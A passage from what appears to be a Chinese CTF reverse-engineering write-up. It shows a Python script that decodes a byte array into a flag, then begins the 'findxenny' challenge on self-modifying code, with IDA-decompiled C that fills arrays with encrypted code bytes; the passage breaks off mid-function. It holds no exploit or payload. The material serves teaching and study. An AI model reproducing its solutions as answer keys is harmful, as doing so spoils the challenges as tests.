<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ida_chars数组转换为int数组（假设每个int占4字节，小端序）</span></span><br><span class="line">v4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ida_chars), <span class="number">4</span>):</span><br><span class="line">    int_value = ida_chars[i] | (ida_chars[i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (ida_chars[i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (ida_chars[i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    v4.append(int_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建v5字符串</span></span><br><span class="line">v5 = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    high = v4[j + <span class="number">1</span>]</span><br><span class="line">    low = v4[j]</span><br><span class="line">    char_value = (high &lt;&lt; <span class="number">4</span>) | low</span><br><span class="line">    v5.append(<span class="built_in">chr</span>(char_value))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接字符列表为字符串</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(v5)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>运行出结果</p><p><img src="/../images/re10.assets/1749864438915-16.png" alt="img"></p><h1 id="NSSRound-2-Able-findxenny"><a href="#NSSRound-2-Able-findxenny" class="headerlink" title="[NSSRound#2 Able]findxenny"></a>[NSSRound#2 Able]findxenny</h1><p>这道题主要是考察SMC</p><p>先查壳</p><p><img src="/../images/re10.assets/1749864438915-17.png" alt="img"></p><p>进去 直接查看main函数</p><p><img src="/../images/re10.assets/1749864438915-18.png" alt="img"></p><p>看一下具体内容</p><p><code>   sub_140011514();</code>这个是SMC的解密函数</p><p>跟进看一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">sub_140018420</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">9</span>]; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">9</span>]; <span class="comment">// [rsp+39h] [rbp+19h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">94</span>]; <span class="comment">// [rsp+42h] [rbp+22h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">128</span>]; <span class="comment">// [rsp+A0h] [rbp+80h]</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">104</span>]; <span class="comment">// [rsp+120h] [rbp+100h]</span></span><br><span class="line">  <span class="type">void</span> *lpAddress; <span class="comment">// [rsp+188h] [rbp+168h]</span></span><br><span class="line">  <span class="type">void</span> *v13; <span class="comment">// [rsp+1A8h] [rbp+188h]</span></span><br><span class="line">  <span class="type">void</span> *v14; <span class="comment">// [rsp+1C8h] [rbp+1A8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1E4h] [rbp+1C4h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+204h] [rbp+1E4h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+224h] [rbp+204h]</span></span><br><span class="line">  DWORD flOldProtect[<span class="number">101</span>]; <span class="comment">// [rsp+244h] [rbp+224h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">250</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_14002F034, a2, a3);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">23</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">-36</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">-77</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">31</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">23</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">-42</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">83</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">123</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="number">-104</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;\x1B&#123;W07&quot;</span>);</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">38</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">-104</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">27</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v9, <span class="string">&quot;&#123;S0*&quot;</span>);</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">-44</span>;</span><br><span class="line">  v9[<span class="number">7</span>] = <span class="number">99</span>;</span><br><span class="line">  v9[<span class="number">8</span>] = <span class="number">123</span>;</span><br><span class="line">  v9[<span class="number">9</span>] = <span class="number">-44</span>;</span><br><span class="line">  v9[<span class="number">10</span>] = <span class="number">43</span>;</span><br><span class="line">  v9[<span class="number">11</span>] = <span class="number">123</span>;</span><br><span class="line">  v9[<span class="number">12</span>] = <span class="number">87</span>;</span><br><span class="line">  v9[<span class="number">13</span>] = <span class="number">102</span>;</span><br><span class="line">  v9[<span class="number">14</span>] = <span class="number">-88</span>;</span><br><span class="line">  v9[<span class="number">15</span>] = <span class="number">42</span>;</span><br><span class="line">  v9[<span class="number">16</span>] = <span class="number">74</span>;</span><br><span class="line">  v9[<span class="number">17</span>] = <span class="number">-44</span>;</span><br><span class="line">  v9[<span class="number">18</span>] = <span class="number">35</span>;</span><br><span class="line">  v9[<span class="number">19</span>] = <span class="number">123</span>;</span><br><span class="line">  v9[<span class="number">20</span>] = <span class="number">91</span>;</span><br><span class="line">  v9[<span class="number">21</span>] = <span class="number">-44</span>;</span><br><span class="line">  v9[<span class="number">22</span>] = <span class="number">43</span>;</span><br><span class="line">  v9[<span class="number">23</span>] = <span class="number">123</span>;</span><br><span class="line">  v9[<span class="number">24</span>] = <span class="number">83</span>;</span><br><span class="line">  v9[<span class="number">25</span>] = <span class="number">102</span>;</span><br><span class="line">  v9[<span class="number">26</span>] = <span class="number">-88</span>;</span><br><span class="line">  v9[<span class="number">27</span>] = <span class="number">42</span>;</span><br><span class="line">  v9[<span class="number">28</span>] = <span class="number">86</span>;</span><br><span class="line">  v9[<span class="number">29</span>] = <span class="number">23</span>;</span><br><span class="line">  v9[<span class="number">30</span>] = <span class="number">-104</span>;</span><br><span class="line">  v9[<span class="number">31</span>] = <span class="number">-97</span>;</span><br><span class="line">  v9[<span class="number">32</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">33</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">34</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">35</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">36</span>] = <span class="number">-76</span>;</span><br><span class="line">  v9[<span class="number">37</span>] = <span class="number">82</span>;</span><br><span class="line">  v9[<span class="number">38</span>] = <span class="number">23</span>;</span><br><span class="line">  v9[<span class="number">39</span>] = <span class="number">-104</span>;</span><br><span class="line">  v9[<span class="number">40</span>] = <span class="number">-97</span>;</span><br><span class="line">  v9[<span class="number">41</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">42</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">43</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">44</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">45</span>] = <span class="number">23</span>;</span><br><span class="line">  v9[<span class="number">46</span>] = <span class="number">-36</span>;</span><br><span class="line">  v9[<span class="number">47</span>] = <span class="number">-73</span>;</span><br><span class="line">  v9[<span class="number">48</span>] = <span class="number">94</span>;</span><br><span class="line">  v9[<span class="number">49</span>] = <span class="number">-76</span>;</span><br><span class="line">  v9[<span class="number">50</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">51</span>] = <span class="number">23</span>;</span><br><span class="line">  v9[<span class="number">52</span>] = <span class="number">-36</span>;</span><br><span class="line">  v9[<span class="number">53</span>] = <span class="number">-101</span>;</span><br><span class="line">  v9[<span class="number">54</span>] = <span class="number">31</span>;</span><br><span class="line">  v9[<span class="number">55</span>] = <span class="number">-100</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">-12</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">-101</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">55</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">-2</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">123</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">83</span>;</span><br><span class="line">  v10[<span class="number">8</span>] = <span class="number">-80</span>;</span><br><span class="line">  v10[<span class="number">9</span>] = <span class="number">51</span>;</span><br><span class="line">  v10[<span class="number">10</span>] = <span class="number">83</span>;</span><br><span class="line">  v10[<span class="number">11</span>] = <span class="number">103</span>;</span><br><span class="line">  v10[<span class="number">12</span>] = <span class="number">24</span>;</span><br><span class="line">  v10[<span class="number">13</span>] = <span class="number">2</span>;</span><br><span class="line">  v10[<span class="number">14</span>] = <span class="number">25</span>;</span><br><span class="line">  v10[<span class="number">15</span>] = <span class="number">19</span>;</span><br><span class="line">  v10[<span class="number">16</span>] = <span class="number">-80</span>;</span><br><span class="line">  v10[<span class="number">17</span>] = <span class="number">51</span>;</span><br><span class="line">  v10[<span class="number">18</span>] = <span class="number">83</span>;</span><br><span class="line">  v10[<span class="number">19</span>] = <span class="number">99</span>;</span><br><span class="line">  v10[<span class="number">20</span>] = <span class="number">40</span>;</span><br><span class="line">  v10[<span class="number">21</span>] = <span class="number">24</span>;</span><br><span class="line">  v10[<span class="number">22</span>] = <span class="number">2</span>;</span><br><span class="line">  v10[<span class="number">23</span>] = <span class="number">5</span>;</span><br><span class="line">  v10[<span class="number">24</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">25</span>] = <span class="number">-80</span>;</span><br><span class="line">  v10[<span class="number">26</span>] = <span class="number">-74</span>;</span><br><span class="line">  v10[<span class="number">27</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">28</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">29</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">30</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">31</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">32</span>] = <span class="number">-80</span>;</span><br><span class="line">  v10[<span class="number">33</span>] = <span class="number">-75</span>;</span><br><span class="line">  v10[<span class="number">34</span>] = <span class="number">127</span>;</span><br><span class="line">  v10[<span class="number">35</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">36</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">37</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">38</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">39</span>] = <span class="number">70</span>;</span><br><span class="line">  v10[<span class="number">40</span>] = <span class="number">-73</span>;</span><br><span class="line">  v10[<span class="number">41</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">42</span>] = <span class="number">70</span>;</span><br><span class="line">  v10[<span class="number">43</span>] = <span class="number">-84</span>;</span><br><span class="line">  v10[<span class="number">44</span>] = <span class="number">-3</span>;</span><br><span class="line">  v10[<span class="number">45</span>] = <span class="number">115</span>;</span><br><span class="line">  v10[<span class="number">46</span>] = <span class="number">123</span>;</span><br><span class="line">  v10[<span class="number">47</span>] = <span class="number">-3</span>;</span><br><span class="line">  v10[<span class="number">48</span>] = <span class="number">43</span>;</span><br><span class="line">  v10[<span class="number">49</span>] = <span class="number">123</span>;</span><br><span class="line">  v10[<span class="number">50</span>] = <span class="number">103</span>;</span><br><span class="line">  v10[<span class="number">51</span>] = <span class="number">79</span>;</span><br><span class="line">  v10[<span class="number">52</span>] = <span class="number">-81</span>;</span><br><span class="line">  v10[<span class="number">53</span>] = <span class="number">2</span>;</span><br><span class="line">  v10[<span class="number">54</span>] = <span class="number">103</span>;</span><br><span class="line">  v10[<span class="number">55</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">56</span>] = <span class="number">-120</span>;</span><br><span class="line">  v10[<span class="number">57</span>] = <span class="number">-74</span>;</span><br><span class="line">  v10[<span class="number">58</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">59</span>] = <span class="number">78</span>;</span><br><span class="line">  v10[<span class="number">60</span>] = <span class="number">-90</span>;</span><br><span class="line">  v10[<span class="number">61</span>] = <span class="number">11</span>;</span><br><span class="line">  v10[<span class="number">62</span>] = <span class="number">-102</span>;</span><br><span class="line">  v10[<span class="number">63</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">64</span>] = <span class="number">70</span>;</span><br><span class="line">  v10[<span class="number">65</span>] = <span class="number">-73</span>;</span><br><span class="line">  v10[<span class="number">66</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">67</span>] = <span class="number">-12</span>;</span><br><span class="line">  v10[<span class="number">68</span>] = <span class="number">-77</span>;</span><br><span class="line">  v10[<span class="number">69</span>] = <span class="number">55</span>;</span><br><span class="line">  v10[<span class="number">70</span>] = <span class="number">-76</span>;</span><br><span class="line">  v10[<span class="number">71</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">72</span>] = <span class="number">-80</span>;</span><br><span class="line">  v10[<span class="number">73</span>] = <span class="number">-73</span>;</span><br><span class="line">  v10[<span class="number">74</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">75</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">76</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">77</span>] = <span class="number">119</span>;</span><br><span class="line">  v10[<span class="number">78</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">79</span>] = <span class="number">-12</span>;</span><br><span class="line">  v10[<span class="number">80</span>] = <span class="number">-97</span>;</span><br><span class="line">  v10[<span class="number">81</span>] = <span class="number">118</span>;</span><br><span class="line">  v10[<span class="number">82</span>] = <span class="number">63</span>;</span><br><span class="line">  v10[<span class="number">83</span>] = <span class="number">-12</span>;</span><br><span class="line">  v10[<span class="number">84</span>] = <span class="number">-77</span>;</span><br><span class="line">  v10[<span class="number">85</span>] = <span class="number">55</span>;</span><br><span class="line">  v10[<span class="number">86</span>] = <span class="number">-76</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">-27</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">-118</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">70</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">-17</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">106</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">66</span>;</span><br><span class="line">  v11[<span class="number">8</span>] = <span class="number">39</span>;</span><br><span class="line">  v11[<span class="number">9</span>] = <span class="number">-36</span>;</span><br><span class="line">  v11[<span class="number">10</span>] = <span class="number">65</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">72</span>;</span><br><span class="line">  v11[<span class="number">12</span>] = <span class="number">97</span>;</span><br><span class="line">  v11[<span class="number">13</span>] = <span class="number">26</span>;</span><br><span class="line">  v11[<span class="number">14</span>] = <span class="number">39</span>;</span><br><span class="line">  v11[<span class="number">15</span>] = <span class="number">-25</span>;</span><br><span class="line">  v11[<span class="number">16</span>] = <span class="number">-108</span>;</span><br><span class="line">  v11[<span class="number">17</span>] = <span class="number">30</span>;</span><br><span class="line">  v11[<span class="number">18</span>] = <span class="number">48</span>;</span><br><span class="line">  v11[<span class="number">19</span>] = <span class="number">82</span>;</span><br><span class="line">  v11[<span class="number">20</span>] = <span class="number">116</span>;</span><br><span class="line">  v11[<span class="number">21</span>] = <span class="number">-19</span>;</span><br><span class="line">  v11[<span class="number">22</span>] = <span class="number">90</span>;</span><br><span class="line">  v11[<span class="number">23</span>] = <span class="number">66</span>;</span><br><span class="line">  v11[<span class="number">24</span>] = <span class="number">34</span>;</span><br><span class="line">  v11[<span class="number">25</span>] = <span class="number">95</span>;</span><br><span class="line">  v11[<span class="number">26</span>] = <span class="number">-79</span>;</span><br><span class="line">  v11[<span class="number">27</span>] = <span class="number">19</span>;</span><br><span class="line">  v11[<span class="number">28</span>] = <span class="number">120</span>;</span><br><span class="line">  v11[<span class="number">29</span>] = <span class="number">-19</span>;</span><br><span class="line">  v11[<span class="number">30</span>] = <span class="number">26</span>;</span><br><span class="line">  v11[<span class="number">31</span>] = <span class="number">66</span>;</span><br><span class="line">  v11[<span class="number">32</span>] = <span class="number">98</span>;</span><br><span class="line">  v11[<span class="number">33</span>] = <span class="number">39</span>;</span><br><span class="line">  v11[<span class="number">34</span>] = <span class="number">-36</span>;</span><br><span class="line">  v11[<span class="number">35</span>] = <span class="number">41</span>;</span><br><span class="line">  v11[<span class="number">36</span>] = <span class="number">92</span>;</span><br><span class="line">  v11[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">  v11[<span class="number">38</span>] = <span class="number">-31</span>;</span><br><span class="line">  v11[<span class="number">39</span>] = <span class="number">39</span>;</span><br><span class="line">  v11[<span class="number">40</span>] = <span class="number">-25</span>;</span><br><span class="line">  v11[<span class="number">41</span>] = <span class="number">-108</span>;</span><br><span class="line">  v11[<span class="number">42</span>] = <span class="number">71</span>;</span><br><span class="line">  v11[<span class="number">43</span>] = <span class="number">37</span>;</span><br><span class="line">  v11[<span class="number">44</span>] = <span class="number">3</span>;</span><br><span class="line">  v11[<span class="number">45</span>] = <span class="number">-31</span>;</span><br><span class="line">  v11[<span class="number">46</span>] = <span class="number">34</span>;</span><br><span class="line">  v11[<span class="number">47</span>] = <span class="number">95</span>;</span><br><span class="line">  v11[<span class="number">48</span>] = <span class="number">-79</span>;</span><br><span class="line">  v11[<span class="number">49</span>] = <span class="number">19</span>;</span><br><span class="line">  v11[<span class="number">50</span>] = <span class="number">110</span>;</span><br><span class="line">  v11[<span class="number">51</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">52</span>] = <span class="number">87</span>;</span><br><span class="line">  v11[<span class="number">53</span>] = <span class="number">-90</span>;</span><br><span class="line">  v11[<span class="number">54</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">55</span>] = <span class="number">-27</span>;</span><br><span class="line">  v11[<span class="number">56</span>] = <span class="number">-94</span>;</span><br><span class="line">  v11[<span class="number">57</span>] = <span class="number">70</span>;</span><br><span class="line">  v11[<span class="number">58</span>] = <span class="number">-91</span>;</span><br><span class="line">  v11[<span class="number">59</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">60</span>] = <span class="number">-27</span>;</span><br><span class="line">  v11[<span class="number">61</span>] = <span class="number">-94</span>;</span><br><span class="line">  v11[<span class="number">62</span>] = <span class="number">70</span>;</span><br><span class="line">  v11[<span class="number">63</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">64</span>] = <span class="number">87</span>;</span><br><span class="line">  v11[<span class="number">65</span>] = <span class="number">-90</span>;</span><br><span class="line">  v11[<span class="number">66</span>] = <span class="number">46</span>;</span><br><span class="line">  v11[<span class="number">67</span>] = 